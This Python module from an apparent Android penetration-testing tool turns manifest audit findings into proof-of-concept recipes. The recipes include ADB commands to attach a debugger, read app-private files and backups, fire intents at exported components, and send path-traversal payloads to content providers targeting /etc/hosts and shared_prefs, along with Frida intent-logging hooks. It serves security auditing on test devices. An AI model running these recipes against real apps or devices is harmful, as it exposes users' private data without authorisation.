"""PoC generator — turn manifest_audit findings into runnable recipes.

Phase 3 / Unit 1. Operates on the AndroidAppMeta + AndroidAuditReport pair
already produced by Phase 2 (apk_decoder + manifest_audit). For each
finding with an actionable attack vector, emits one or more PoCArtifact
records: ADB shell snippets, Frida hook snippets, or informational notes.

Pure function — no APK probing, no device contact, no subprocess. The
recipes are textual templates the operator runs themselves on a controlled
test device. Placeholders in the form ``{...}`` are filled where the
manifest data permits; remaining placeholders are documented in each
artifact's ``notes``.

Coverage:
    MANIFEST-001  Debuggable       — jdwp + run-as (kind=adb)
    MANIFEST-002  Cleartext        — mitmproxy interception recipe (shell)
    MANIFEST-003  Allow Backup     — adb backup data extraction (adb)
    MANIFEST-004  Exported comp    — am start/startservice/broadcast per
                                     intent_action (adb) + a Frida hook
                                     observer on the entry method
                                     (onCreate / onStartCommand /
                                     onReceive) so the operator can pair
                                     invocation with payload capture
    MANIFEST-005  Exported provider— content query (adb; real authority
                                     when AndroidComponent.authorities
                                     is set)
    MANIFEST-006  grantUri        — path-traversal probes via content://
                                     (adb; authority resolved from
                                     manifest)

MANIFEST-007/008/009 are policy/posture findings without a direct PoC and
are intentionally skipped.
"""

from __future__ import annotations

import json
import shlex
from typing import Callable

from venomhook.models import (
    AndroidAppMeta,
    AndroidAuditReport,
    AndroidComponent,
    ManifestFinding,
    PoCArtifact,
)


__all__ = [
    "generate_pocs",
    "format_pocs_text",
    "PER_RULE_BUILDERS",
]


# ---------- helpers ----------


def _find_component(meta: AndroidAppMeta, fqn: str | None) -> AndroidComponent | None:
    if not fqn:
        return None
    for c in meta.components:
        if c.name == fqn:
            return c
    return None


def _launcher_activity(meta: AndroidAppMeta) -> AndroidComponent | None:
    """Best-effort launcher pick: an activity declaring the MAIN action."""
    for c in meta.components:
        if c.type != "activity":
            continue
        if "android.intent.action.MAIN" in c.intent_actions:
            return c
    activities = [c for c in meta.components if c.type == "activity"]
    return activities[0] if activities else None


def _single_line(value: object) -> str:
    """Keep generated script commands one physical line per recipe step."""
    return str(value).replace("\r", "\\r").replace("\n", "\\n")


def _shell_join(args: list[object]) -> str:
    return shlex.join(_single_line(a) for a in args)


def _shell_arg(value: object) -> str:
    return shlex.quote(_single_line(value))


def _adb_shell(remote_args: list[object]) -> str:
    """Quote both host-shell and Android remote-shell parsing layers."""
    return _shell_join(["adb", "shell", _shell_join(remote_args)])


def _adb_shell_cmd(remote_cmd: str) -> str:
    return _shell_join(["adb", "shell", remote_cmd])


def _js_string(value: object) -> str:
    return json.dumps(str(value))


# ---------- per-rule builders ----------


def _build_debuggable(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    launcher = _launcher_activity(meta)
    launcher_name = launcher.name if launcher else f"{pkg}.MainActivity"
    launcher_note = (
        ""
        if launcher and "android.intent.action.MAIN" in launcher.intent_actions
        else (
            "manifest에서 런처 액티비티를 찾을 수 없습니다. 실제 액티비티 FQN으로 "
            "교체해 사용하세요."
        )
    )
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="디버깅 가능 프로세스에 jdb 연결",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            # MANIFEST-001은 app-level finding (finding.component=None).
            # 런처 액티비티는 프로세스를 시작하기 위한 수단일 뿐 per-component
            # target이 아니므로 component 필드는 finding과 동일하게 None을
            # 유지해야 (rule_id, component) 조인 시 같은 그룹으로 묶입니다.
            component=finding.component,
            description=(
                "android:debuggable=true 상태에서는 jdb / Android Studio를 실행 중인 "
                "프로세스에 연결해 브레이크포인트 설정, 변수 조사, 메서드 호출이 "
                "가능합니다 — 앱 내부의 변조 방지 로직도 우회됩니다."
            ),
            commands=[
                _adb_shell(["am", "start", "-D", "-n", f"{pkg}/{launcher_name}"]),
                f"PID=$({_adb_shell(['pidof', pkg])})",
                "adb forward tcp:8700 jdwp:$PID",
                "jdb -attach localhost:8700 -sourcepath .",
            ],
            expected_evidence=(
                "jdb가 'Initializing jdb ...'와 (jdb) 프롬프트를 출력하고, "
                "'classes' 명령으로 애플리케이션 클래스 목록이 조회됩니다."
            ),
            notes=launcher_note,
            references=list(finding.references),
        ),
        PoCArtifact(
            rule_id=finding.rule_id,
            title="run-as로 앱 비공개 파일 읽기",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            description=(
                "디버깅 가능 앱은 root 권한 없는 단말에서도 `adb shell run-as <pkg>` "
                "사용을 허용합니다. /data/data/<pkg>/ 하위의 SharedPreferences, "
                "sqlite 데이터베이스, 암호화 키 등이 모두 노출됩니다."
            ),
            commands=[
                _adb_shell([
                    "run-as", pkg, "ls", "-la",
                    "databases/", "shared_prefs/", "files/",
                ]),
                _adb_shell_cmd(f"run-as {_shell_arg(pkg)} cat shared_prefs/*.xml"),
            ],
            expected_evidence=(
                "앱의 비공개 저장소 디렉터리 리스팅과 XML 환경설정 내용이 "
                "출력됩니다 — root 권한 없이는 통상 접근 불가한 데이터입니다."
            ),
            references=list(finding.references),
        ),
    ]


def _build_cleartext(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="mitmproxy로 HTTP 트래픽 가로채기",
            severity=finding.severity,
            kind="shell",
            package_name=pkg,
            description=(
                "평문 트래픽이 허용되면 경로상의 공격자가 HTTP 요청/응답을 "
                "그대로 읽고 변조할 수 있습니다. 단말이 프록시 경로를 통과하도록 "
                "설정하면 앱 수정이나 루팅 없이도 채널이 평문임을 mitmproxy로 "
                "직접 입증할 수 있습니다."
            ),
            commands=[
                "mitmproxy --listen-port 8080 --mode regular",
                "# 단말에서: 설정 > Wi-Fi > <네트워크> > "
                "프록시: 수동 host=<PC IP> port=8080",
                _adb_shell(["am", "start", "-n", f"{pkg}/.MainActivity"]),
                "# mitmproxy 콘솔에서 평문 요청/응답 쌍 관찰",
            ],
            expected_evidence=(
                "mitmproxy에 전체 URL, 헤더, 바디가 평문으로 표시됩니다 (TLS "
                "핸드셰이크 없음)."
            ),
            notes=(
                "Network Security Config가 존재해도 cleartext가 허용된 특정 "
                "도메인이 명시되어 있다면 본 룰이 발동할 수 있습니다. "
                "res/xml/network_security_config.xml을 확인해 해당 호스트를 "
                "식별하세요."
            ),
            references=list(finding.references),
        ),
    ]


def _build_allow_backup(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="adb backup으로 앱 데이터 추출",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            description=(
                "android:allowBackup=true (API 31 미만 기본값) 상태에서는 USB "
                "디버깅 권한만으로 전체 데이터 백업이 가능합니다 — "
                "SharedPreferences, 데이터베이스, 파일 모두 포함. root 불필요."
            ),
            commands=[
                _shell_join([
                    "adb", "backup", "-f", f"{pkg}.ab",
                    "-apk", "-shared", "-all", "-system", pkg,
                ]),
                "# 단말 화면의 'Back up my data'(내 데이터 백업) 안내를 탭",
                f"dd if={_shell_arg(f'{pkg}.ab')} bs=24 skip=1 | "
                f"openssl zlib -d > {_shell_arg(f'{pkg}.tar')}",
                _shell_join(["tar", "-xvf", f"{pkg}.tar"]),
            ],
            expected_evidence=(
                "tar 파일 내부에 apps/<pkg>/{sp,db,f,r}/ 디렉터리 트리와 앱의 "
                "비공개 데이터 파일들이 포함되어 있습니다."
            ),
            notes=(
                "백업 결과가 0바이트라면 fullBackupContent로 전부 제외된 것 — "
                "부분적 보호일 뿐 근본 해결책은 아닙니다. API 31+ 단말에서는 "
                "--no-system 옵션이 필요할 수 있습니다."
            ),
            references=list(finding.references),
        ),
    ]


def _am_command_for(component: AndroidComponent, pkg: str, action: str | None) -> str:
    """Compose an `adb shell am ...` line for a given component type."""
    args = ["am"]
    if component.type == "activity":
        args.append("start")
    elif component.type == "service":
        args.append("startservice")
    elif component.type == "receiver":
        args.append("broadcast")
    else:
        # Fallback (provider falls under MANIFEST-005, not this builder).
        args.append("start")
    if action:
        args.extend(["-a", action])
    args.extend(["-n", f"{pkg}/{component.name}"])
    return _adb_shell(args)


def _build_exported_no_permission(
    meta: AndroidAppMeta, finding: ManifestFinding
) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    component = _find_component(meta, finding.component)
    if component is None:
        # 축소 모드 — 메타에서 컴포넌트 정보를 충분히 얻지 못한 경우.
        return [PoCArtifact(
            rule_id=finding.rule_id,
            title=f"외부 노출 컴포넌트 호출: {finding.component or '<미상>'}",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "권한 없이 외부 노출된 컴포넌트입니다. 컴포넌트 종류에 맞춰 `am` "
                "서브커맨드(start/startservice/broadcast)를 적절히 교체하세요."
            ),
            commands=[
                _adb_shell([
                    "am", "start", "-n",
                    f"{pkg}/{finding.component or '<class>'}",
                ])
            ],
            references=list(finding.references),
        )]

    type_korean = {
        "activity": "액티비티",
        "service": "서비스",
        "receiver": "리시버",
        "provider": "프로바이더",
    }.get(component.type, component.type)

    actions = component.intent_actions or [None]
    artifacts: list[PoCArtifact] = []
    for action in actions:
        cmd = _am_command_for(component, pkg, action)
        artifacts.append(PoCArtifact(
            rule_id=finding.rule_id,
            title=f"외부 노출 {type_korean} '{component.name}' 호출"
            + (f" (action={action})" if action else ""),
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=component.name,
            description=(
                f"외부에 노출된 {type_korean}가 권한 없이 외부 인텐트를 수용합니다. "
                "본 레시피는 직접 인텐트를 전송합니다 — 실제 공격에서는 "
                "onCreate/onReceive 안의 신뢰 결정 지점으로 전달되는 extras를 "
                "조작해 함께 보냅니다."
            ),
            commands=[
                cmd,
                "# 파싱 로직을 탐색하려면 extras를 추가, 예:",
                f"#   {cmd} --es payload \"$(printf 'A%.0s' {{1..1024}})\"",
            ],
            expected_evidence=(
                "컴포넌트가 호출자 shell uid(2000)로 시작/수신됩니다 (앱 uid가 "
                "아님). logcat에 onCreate/onStartCommand/onReceive 진입 로그가 "
                "남습니다."
            ),
            references=list(finding.references),
        ))
    artifacts.append(_frida_intent_observer(component, pkg, finding))
    return artifacts


def _frida_intent_observer(
    component: AndroidComponent, pkg: str, finding: ManifestFinding
) -> PoCArtifact:
    """Frida script that hooks the component's entry point and logs the
    incoming Intent + extras. Lets the operator confirm the ADB recipe
    actually reached the component and observe what payload arrived.
    """
    if component.type == "activity":
        body = _FRIDA_ACTIVITY_TEMPLATE.format(klass=_js_string(component.name))
        entry = "onCreate"
    elif component.type == "service":
        body = _FRIDA_SERVICE_TEMPLATE.format(klass=_js_string(component.name))
        entry = "onStartCommand"
    elif component.type == "receiver":
        body = _FRIDA_RECEIVER_TEMPLATE.format(klass=_js_string(component.name))
        entry = "onReceive"
    else:  # pragma: no cover — providers go through MANIFEST-005
        body = f"// unsupported component type: {component.type}"
        entry = "?"
    type_korean = {
        "activity": "액티비티",
        "service": "서비스",
        "receiver": "리시버",
        "provider": "프로바이더",
    }.get(component.type, component.type)
    return PoCArtifact(
        rule_id=finding.rule_id,
        title=f"Frida로 '{component.name}' 인텐트 관찰 ({entry})",
        severity=finding.severity,
        kind="frida",
        package_name=pkg,
        component=component.name,
        description=(
            f"'{component.name}'의 {type_korean}.{entry}를 후킹해 들어오는 인텐트의 "
            "action과 extras를 출력합니다. ADB 레시피와 함께 실행해 도달 가능성과 "
            "공격자가 보내는 페이로드 형태를 동시에 확인하세요."
        ),
        commands=body.splitlines(),
        expected_evidence=(
            f"외부에서 호출될 때마다 frida 콘솔에 '[+] {component.name}.{entry} ...'가 "
            "출력되고, extras 덤프를 통해 호출자가 전달한 매개변수를 확인할 수 "
            "있습니다."
        ),
        notes=(
            "실행 방법: "
            + _shell_join([
                "frida", "-U", "-f", pkg,
                "-l", "<this-file>.frida.js", "--no-pause",
            ])
        ),
        references=list(finding.references),
    )


_FRIDA_ACTIVITY_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use({klass});
  const KlassName = {klass};
  Klass.onCreate.overload('android.os.Bundle').implementation = function (b) {{
    console.log("[+] " + KlassName + ".onCreate called");
    const intent = this.getIntent();
    if (intent) {{
      console.log("[+]   action:", intent.getAction());
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onCreate(b);
  }};
}});"""

_FRIDA_SERVICE_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use({klass});
  const KlassName = {klass};
  Klass.onStartCommand.implementation = function (intent, flags, startId) {{
    const action = intent ? intent.getAction() : null;
    console.log("[+] " + KlassName + ".onStartCommand action =", action);
    if (intent) {{
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onStartCommand(intent, flags, startId);
  }};
}});"""

_FRIDA_RECEIVER_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use({klass});
  const KlassName = {klass};
  Klass.onReceive.implementation = function (ctx, intent) {{
    const action = intent ? intent.getAction() : null;
    console.log("[+] " + KlassName + ".onReceive action =", action);
    if (intent) {{
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onReceive(ctx, intent);
  }};
}});"""


def _provider_authority(meta: AndroidAppMeta, finding: ManifestFinding) -> tuple[str, str]:
    """Return (authority, notes_suffix) for a provider finding.

    Looks up the AndroidComponent matching finding.component and uses its
    first declared authority. Falls back to '<AUTHORITY>' placeholder with
    a guidance note when the manifest declared no authority (e.g., older
    apktool output) or the component isn't present in meta.
    """
    component = _find_component(meta, finding.component)
    if component and component.authorities:
        primary = component.authorities[0]
        suffix = ""
        if len(component.authorities) > 1:
            extras = ", ".join(component.authorities[1:])
            suffix = f"추가로 선언된 authorities: {extras}."
        return primary, suffix
    return (
        "<AUTHORITY>",
        "본 프로바이더에 android:authorities가 선언되어 있지 않습니다. "
        "디코딩된 AndroidManifest.xml에서 실제 authority를 확인해 교체하세요.",
    )


def _build_exported_provider(
    meta: AndroidAppMeta, finding: ManifestFinding
) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    authority, notes_suffix = _provider_authority(meta, finding)
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title=f"외부 노출 프로바이더 '{finding.component}' 조회",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "외부 노출된 프로바이더는 content:// URI를 다른 앱에 공개합니다. "
                "root 권한이나 특수 권한 없이도 `adb shell content`로 "
                "query/insert/update/delete를 호출할 수 있습니다."
            ),
            commands=[
                _adb_shell(["content", "query", "--uri", f"content://{authority}/"]),
                _adb_shell([
                    "content", "query", "--uri",
                    f"content://{authority}/<path>",
                ]),
            ],
            expected_evidence=(
                "프로바이더가 반환한 행이 출력되거나 'No result found.'가 표시됩니다. "
                "(비인가 거부 시에는 SecurityException이 발생합니다.)"
            ),
            notes=notes_suffix,
            references=list(finding.references),
        ),
    ]


def _build_grant_uri(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    authority, notes_suffix = _provider_authority(meta, finding)
    notes = "프로바이더가 외부 노출(MANIFEST-005)도 함께 발생한 경우 결합해 시도."
    if notes_suffix:
        notes = f"{notes} {notes_suffix}"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title=f"'{finding.component}' Path-traversal 시도",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "grantUriPermissions=true와 약한 경로 검증이 결합되면 호출자가 URI "
                "경로에 '..' 세그먼트를 주입해 의도된 디렉터리 밖의 파일을 읽을 수 "
                "있습니다."
            ),
            commands=[
                "# 도달 가능성 확인을 위한 정상 경로 시도:",
                _adb_shell([
                    "content", "query", "--uri",
                    f"content://{authority}/files/test",
                ]),
                "# Traversal 페이로드 시도:",
                _adb_shell([
                    "content", "read", "--uri",
                    f"content://{authority}/files/../../../etc/hosts",
                ]),
                _adb_shell([
                    "content", "read", "--uri",
                    f"content://{authority}/files/..%2F..%2F..%2Fdata%2Fdata%2F"
                    + pkg + "%2Fshared_prefs%2F",
                ]),
            ],
            expected_evidence=(
                "프로바이더의 의도된 루트 밖 파일 내용 (예: /etc/hosts, 앱 비공개 "
                "SharedPreferences)이 반환됩니다 — 정규화(canonicalization) 누락의 "
                "증거입니다."
            ),
            notes=notes,
            references=list(finding.references),
        ),
    ]


# ---------- registry & entry point ----------


PER_RULE_BUILDERS: dict[str, Callable[[AndroidAppMeta, ManifestFinding], list[PoCArtifact]]] = {
    "MANIFEST-001": _build_debuggable,
    "MANIFEST-002": _build_cleartext,
    "MANIFEST-003": _build_allow_backup,
    "MANIFEST-004": _build_exported_no_permission,
    "MANIFEST-005": _build_exported_provider,
    "MANIFEST-006": _build_grant_uri,
}


def generate_pocs(
    meta: AndroidAppMeta, report: AndroidAuditReport
) -> list[PoCArtifact]:
    """Build PoC artifacts for every finding with a registered builder.

    Findings whose rule_id has no builder (informational rules like
    MANIFEST-007..009) are skipped silently. Output order mirrors
    ``report.findings`` so the operator can read PoCs alongside the audit.
    """
    artifacts: list[PoCArtifact] = []
    for f in report.findings:
        builder = PER_RULE_BUILDERS.get(f.rule_id)
        if builder is None:
            continue
        artifacts.extend(builder(meta, f))
    return artifacts


def format_pocs_text(artifacts: list[PoCArtifact]) -> str:
    """Render artifacts as a terminal-friendly text bundle.

    One section per artifact, ordered as given. Commands are indented two
    spaces so the bundle can be grepped/sliced without breaking quoting.
    """
    if not artifacts:
        return "PoC 번들 — (실행 가능한 finding 없음)"

    lines = [f"PoC 번들 — 아티팩트 {len(artifacts)}개", ""]
    for i, a in enumerate(artifacts, 1):
        comp = f" [{a.component}]" if a.component else ""
        lines.append(f"#{i} [{a.severity.upper()}] {a.rule_id} {a.title}{comp}")
        lines.append(f"   종류: {a.kind}    패키지: {a.package_name}")
        if a.description:
            lines.append(f"   {a.description}")
        if a.commands:
            lines.append("   명령어:")
            for c in a.commands:
                lines.append(f"     {c}")
        if a.expected_evidence:
            lines.append(f"   예상 결과: {a.expected_evidence}")
        if a.notes:
            lines.append(f"   비고:      {a.notes}")
        if a.references:
            lines.append(f"   참고:      {', '.join(a.references)}")
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"
